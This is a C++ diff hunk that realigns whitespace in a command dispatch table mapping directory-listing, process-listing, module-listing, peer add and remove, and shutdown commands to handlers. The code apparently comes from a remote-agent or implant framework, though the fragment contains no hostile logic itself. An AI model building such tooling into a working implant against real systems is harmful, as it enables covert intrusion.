@@ -9,12 +9,12 @@ namespace Commands {
     HASH_MAP
         __attribute__((used, section(".rdata"))) cmd_map[] = {
         { .name = DIRECTORYLIST, 	.address = (void*) Commands::DirectoryList        },
-        { .name = PROCESSMODULES,    .address = (void*) Commands::ProcessModules       },
-        { .name = PROCESSLIST,	   .address = (void*) Commands::ProcessList          },
-        { .name = ADDPEER,		   .address = (void*) Commands::CommandAddPeer       },
+        { .name = PROCESSMODULES,   .address = (void*) Commands::ProcessModules       },
+        { .name = PROCESSLIST,	    .address = (void*) Commands::ProcessList          },
+        { .name = ADDPEER,		    .address = (void*) Commands::CommandAddPeer       },
         { .name = REMOVEPEER,		.address = (void*) Commands::CommandRemovePeer    },
-        { .name = SHUTDOWN,		  .address = (void*) Commands::Shutdown             },
-        { .name = 0,				 .address = nullptr		                        },
+        { .name = SHUTDOWN,		    .address = (void*) Commands::Shutdown             },
+        { .name = 0,				.address = nullptr		                        },
     };
 
     VOID DirectoryList (_parser *parser) {
